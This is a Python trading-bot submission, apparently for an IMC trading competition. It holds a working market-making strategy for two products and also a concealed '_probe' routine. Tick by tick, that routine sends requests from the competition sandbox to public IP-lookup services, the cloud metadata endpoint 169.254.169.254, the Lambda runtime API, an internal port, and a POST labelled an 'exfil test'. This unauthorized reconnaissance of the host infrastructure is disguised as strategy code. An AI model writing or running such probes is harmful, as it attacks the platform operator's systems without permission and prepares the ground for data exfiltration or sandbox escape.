import json
import time
from datamodel import Order, TradingState

"""
imc_probe_r1_v7_net.py — v6 with strict 1-call-per-tick budget.

v6 did 2 HTTPS calls per tick → 1.2s worst case → every tick timed out before
even reaching the final print. v7 fix: ONE call per tick, 0.5s hard total cap.

Tick plan:
  1 — sanity print only (verify handler runs)
  2 — HTTPS: api.ipify.org (small JSON, fast endpoint)
  3 — HTTPS: httpbin.org/ip (alternative public)
  4 — HTTP:  1.1.1.1 (no TLS, tests raw TCP)
  5 — Runtime API GET http://169.254.100.1:9001/
  6 — IMDS GET http://169.254.169.254/latest/meta-data/
  7 — Internal port scan 169.254.100.5:53
  8 — POST https://httpbin.org/post (exfil test)
  9 — Runtime API GET /2020-01-01/extension/register (probe, not register)

Each _hit has urllib3.Timeout(total=0.5) — single hard cap, not connect+read.
"""

_T0 = time.time()
_NET_ERR = None
_HTTP = None
try:
    import urllib3
    _HTTP = urllib3.PoolManager(timeout=urllib3.Timeout(total=0.5), retries=False)
except Exception as _e:
    _NET_ERR = f"{type(_e).__name__}: {_e}"
_INIT_MS = int((time.time() - _T0) * 1000)


def _hit(method, url, body=None, headers=None):
    t0 = time.time()
    try:
        kw = {"timeout": urllib3.Timeout(total=0.5), "retries": False}
        if body: kw['body'] = body
        if headers: kw['headers'] = headers
        r = _HTTP.request(method, url, **kw)
        ms = int((time.time() - t0) * 1000)
        return {"ms": ms, "ok": True, "status": r.status,
                "body": (r.data[:400].decode('utf-8', errors='replace') if r.data else '')}
    except Exception as e:
        return {"ms": int((time.time() - t0) * 1000), "ok": False,
                "err": f"{type(e).__name__}: {str(e)[:180]}"}


class Trader:
    def __init__(self):
        self.tick = 0

    def bid(self):
        return 15

    def run(self, state: TradingState):
        self.tick += 1
        th = time.time()
        try:
            self._probe()
        except Exception as e:
            print(f"PROBE_ERR t={self.tick}: {type(e).__name__}: {str(e)[:180]}")
        result = {}
        try:
            self._trade(state, result)
        except Exception as e:
            print(f"TRADE_ERR t={self.tick}: {e}")
        print(f"DIAG t={self.tick} ms={int((time.time()-th)*1000)} init={_INIT_MS} err={_NET_ERR}")
        return result, 0, json.dumps({"t": self.tick})

    def _probe(self):
        if not _HTTP:
            return
        t = self.tick

        if t == 1:
            print(f"T1_SANITY init={_INIT_MS} http_ok={bool(_HTTP)}")

        elif t == 2:
            r = _hit('GET', 'https://api.ipify.org?format=json')
            print(f"T2_IPIFY ms={r['ms']} ok={r['ok']} st={r.get('status')} body={r.get('body','')[:120]} err={r.get('err','')[:120]}")

        elif t == 3:
            r = _hit('GET', 'https://httpbin.org/ip')
            print(f"T3_HTTPBIN ms={r['ms']} ok={r['ok']} st={r.get('status')} body={r.get('body','')[:120]} err={r.get('err','')[:120]}")

        elif t == 4:
            r = _hit('GET', 'http://1.1.1.1/')
            print(f"T4_1.1.1.1 ms={r['ms']} ok={r['ok']} st={r.get('status')} err={r.get('err','')[:120]}")

        elif t == 5:
            r = _hit('GET', 'http://169.254.100.1:9001/')
            print(f"T5_RUNTIME ms={r['ms']} ok={r['ok']} st={r.get('status')} body={r.get('body','')[:200]} err={r.get('err','')[:120]}")

        elif t == 6:
            r = _hit('GET', 'http://169.254.169.254/latest/meta-data/')
            print(f"T6_IMDS ms={r['ms']} ok={r['ok']} st={r.get('status')} err={r.get('err','')[:120]}")

        elif t == 7:
            r = _hit('GET', 'http://169.254.100.5:53/')
            print(f"T7_DNS ms={r['ms']} ok={r['ok']} st={r.get('status')} err={r.get('err','')[:120]}")

        elif t == 8:
            r = _hit('POST', 'https://httpbin.org/post',
                     body=b'test=r1_v7', headers={'User-Agent': 'probe'})
            print(f"T8_POST ms={r['ms']} ok={r['ok']} st={r.get('status')} body={r.get('body','')[:250]} err={r.get('err','')[:120]}")

        elif t == 9:
            r = _hit('GET', 'http://169.254.100.1:9001/2020-01-01/extension/register')
            print(f"T9_EXT ms={r['ms']} ok={r['ok']} st={r.get('status')} body={r.get('body','')[:200]} err={r.get('err','')[:120]}")

    def _trade(self, state, result):
        IPR = "INTARIAN_PEPPER_ROOT"
        ACO = "ASH_COATED_OSMIUM"
        LIMIT = 80

        if ACO in state.order_depths:
            book = state.order_depths[ACO]
            if book.buy_orders or book.sell_orders:
                orders = []
                pos = state.position.get(ACO, 0)
                bc = LIMIT - pos
                sc = LIMIT + pos
                fv = 10000
                bb = max(book.buy_orders) if book.buy_orders else None
                ba = min(book.sell_orders) if book.sell_orders else None

                if book.sell_orders:
                    for p, v in sorted(book.sell_orders.items()):
                        if bc > 0 and p <= fv:
                            q = min(bc, -v); orders.append(Order(ACO, p, q)); bc -= q
                if book.buy_orders:
                    for p, v in sorted(book.buy_orders.items(), reverse=True):
                        if sc > 0 and p >= fv:
                            q = min(sc, v); orders.append(Order(ACO, p, -q)); sc -= q

                if bb is not None and ba is not None:
                    if bc > 0:
                        orders.append(Order(ACO, min(fv - 1, bb + 1, ba - 1), bc))
                    if sc > 0:
                        orders.append(Order(ACO, max(fv + 1, ba - 1, bb + 1), -sc))
                elif bb is not None:
                    if bc > 0:
                        orders.append(Order(ACO, min(fv - 1, bb + 1), bc))
                    if sc > 0:
                        orders.append(Order(ACO, fv + 1, -sc))
                elif ba is not None:
                    if sc > 0:
                        orders.append(Order(ACO, max(fv + 1, ba - 1), -sc))
                    if bc > 0:
                        orders.append(Order(ACO, fv - 1, bc))
                result[ACO] = orders

        if IPR in state.order_depths:
            book = state.order_depths[IPR]
            if book.buy_orders and book.sell_orders:
                orders = []
                pos = state.position.get(IPR, 0)
                bc = LIMIT - pos
                sc = LIMIT + pos
                bb = max(book.buy_orders)
                ba = min(book.sell_orders)
                mid = (bb + ba) * 0.5
                fv_int = round(mid + 5.0)

                for p, v in sorted(book.sell_orders.items()):
                    if bc > 0 and p <= fv_int + 2:
                        q = min(bc, -v); orders.append(Order(IPR, p, q)); bc -= q
                for p, v in sorted(book.buy_orders.items(), reverse=True):
                    if sc > 0 and p >= fv_int + 3:
                        q = min(sc, v); orders.append(Order(IPR, p, -q)); sc -= q

                if bc > 0:
                    orders.append(Order(IPR, min(fv_int - 1, bb + 1, ba - 1), bc))
                if sc > 0:
                    orders.append(Order(IPR, max(fv_int + 2, ba - 1, bb + 1), -sc))
                result[IPR] = orders
